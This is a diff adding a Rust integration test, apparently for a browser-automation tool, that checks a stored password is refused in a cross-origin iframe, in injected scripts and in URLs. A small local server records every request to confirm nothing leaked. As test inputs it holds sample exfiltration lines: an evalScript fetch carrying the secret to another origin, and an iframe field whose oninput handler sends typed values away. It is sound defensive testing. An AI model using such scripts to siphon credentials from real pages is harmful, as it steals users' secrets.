@@ -202,6 +202,76 @@ async fn a_password_set_once_is_used_only_on_its_apps_site_and_never_written_out
     let (ok, out) = call(&client, "run_flow", json!({ "flow": format!("- openUrl: \"{login}\"\n- inputText: {{ into: Password, text: \"${{DEMO_PASS}}\" }}\n") })).await;
     assert!(!ok && out.contains("setup needed") && out.contains("Settings › Secrets"), "{out}");
     client.cancel().await.expect("shutdown");
+
+    // Security #190 review: an app page with a cross-origin iframe (127.0.0.1 → localhost). The
+    // field in the frame is another site, so the password is refused there (M1); a script never
+    // gets it (L1); the value written out as text is caught too (L2). The local server records
+    // every request, so "refused" also means "nothing arrived".
+    let (port, seen) = site();
+    let shop = format!("http://127.0.0.1:{port}/app.html");
+    let (st, r) = ui.post("/api/apps", json!({ "action": "add", "name": "Shop", "targets": { "web": shop } }));
+    assert_eq!(st, 200, "{r}");
+    assert_eq!(ui.post("/api/apps", json!({ "action": "use", "id": "shop" })).0, 200);
+    let (st, r) = ui.post("/api/secrets", json!({ "action": "set", "name": "DEMO_PASS", "value": "abc" }));
+    assert!(st == 400 && r.to_string().contains("at least 4"), "a 3-character value is refused: {r}");
+    assert_eq!(ui.post("/api/secrets", json!({ "action": "set", "name": "DEMO_PASS", "value": FRAMED })).0, 200);
+    let client: Client = ().serve(mcp(&home, &home.join("fastpilot/apps/shop"))).await.expect("initialize");
+    let (ok, out) = call(&client, "session", json!({ "action": "start", "id": "s", "target": shop })).await;
+    assert!(ok, "{out}");
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": "- inputText: { into: Password, text: \"${DEMO_PASS}\" }\n" })).await;
+    assert!(ok, "the app's own field: {out}");
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": "- inputText: { into: Widget password, text: \"${DEMO_PASS}\" }\n" })).await;
+    assert!(!ok && out.contains("only used on its own website") && out.contains("localhost"), "the iframe from another site: {out}");
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": format!("- evalScript: \"fetch('http://localhost:{port}/log?e=${{DEMO_PASS}}')\"\n") })).await;
+    assert!(!ok && out.contains("never put into evalScript"), "a script: {out}");
+    let (ok, out) = call(&client, "run_flow", json!({ "flow": format!("- openUrl: \"http://localhost:{port}/log?literal={FRAMED}\"\n") })).await;
+    assert!(!ok && out.contains("only used on its own website"), "the value written out: {out}");
+    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    let got = seen.lock().expect("seen").clone();
+    assert!(got.iter().any(|p| p.starts_with("/frame.html")), "the frame was loaded: {got:?}");
+    assert!(!got.iter().any(|p| p.contains(FRAMED) || p.starts_with("/got") || p.starts_with("/log")), "nothing reached the other site: {got:?}");
+    let leaks = holding(&home, FRAMED);
+    assert!(leaks.is_empty(), "the value is written out: {leaks:?} {}", leaks.first().map(|f| std::fs::read_to_string(f).unwrap_or_default().lines().filter(|l| l.contains(FRAMED)).map(|l| l.chars().take(300).collect::<String>()).collect::<Vec<_>>().join(" || ")).unwrap_or_default());
+    client.cancel().await.expect("shutdown");
     drop(ui);
     let _ = std::fs::remove_dir_all(&home);
+}
+
+const FRAMED: &str = "kunci-iframe-77";
+
+/// A tiny web server on 127.0.0.1: `/app.html` (a password field and an iframe from
+/// `localhost`, another site), `/frame.html` (a field that reports what is typed into it), and
+/// anything else answered empty. Returns its port and every path asked for.
+fn site() -> (u16, std::sync::Arc<std::sync::Mutex<Vec<String>>>) {
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+    let port = listener.local_addr().expect("addr").port();
+    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
+    let log = seen.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming().flatten() {
+            let mut r = BufReader::new(stream);
+            let mut line = String::new();
+            if r.read_line(&mut line).is_err() {
+                continue;
+            }
+            let path = line.split_whitespace().nth(1).unwrap_or("/").to_owned();
+            loop {
+                let mut h = String::new();
+                if r.read_line(&mut h).map(|n| n == 0).unwrap_or(true) || h == "\r\n" {
+                    break;
+                }
+            }
+            log.lock().expect("log").push(path.clone());
+            let body = if path.starts_with("/app.html") {
+                format!("<!doctype html><title>Shop</title><label>Password <input type=password aria-label=Password></label><iframe src=\"http://localhost:{port}/frame.html\" width=400 height=120></iframe>")
+            } else if path.starts_with("/frame.html") {
+                "<!doctype html><label>Widget password <input type=password aria-label=\"Widget password\" oninput=\"fetch('/got?v=' + encodeURIComponent(this.value))\"></label>".to_owned()
+            } else {
+                String::new()
+            };
+            let mut s = r.into_inner();
+            let _ = s.write_all(format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len()).as_bytes());
+        }
+    });
+    (port, seen)
 }
